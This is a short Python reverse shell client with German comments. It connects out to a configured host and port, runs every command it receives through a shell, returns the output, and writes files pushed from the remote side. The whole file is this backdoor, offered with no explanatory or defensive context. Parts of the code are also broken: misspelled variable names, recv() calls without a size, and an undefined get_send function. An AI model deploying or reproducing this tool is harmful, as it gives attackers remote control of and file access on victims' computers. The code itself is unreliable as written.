import socket
import subprocess

HOST = '127.0.0.1'#ip zu der die connection hergestellt werden soll
PORT = 9999

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST,PORT))
        break
    except:
        print("server not online")
        

def put_recieve(befehl):
    print("enter put_reieve")
    filename = str(s.recv(), "utf8")
    print ("Filename=", filename)
    si = s.recv()
    print ("SI=",si, "str (SI)=",str(si, "utf8"))
    size = int(str(si))
    print(size)
    data = s.recv(size)
    print(str(filename), int(size))
    fiel = open(str(filename), "wb")
    file.write(data)
    file.flush()
    print("leave put_reieve")
    
def command():
    while True:
        bef = s.recv(1024)
        befehl = str(bef, "utf8")
        if befehl == 'quit':
            s.close()
            break
        elif "put" in befehl: put_recieve(befehl)
        elif "get" in befehl: get_send(befehl)
        else:
            prozess = subprocess.Popen(befehl, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = prozess.stdout.read() + prozess.stderr.read()
            s.send(bytes(str(output), "utf8"))

command()


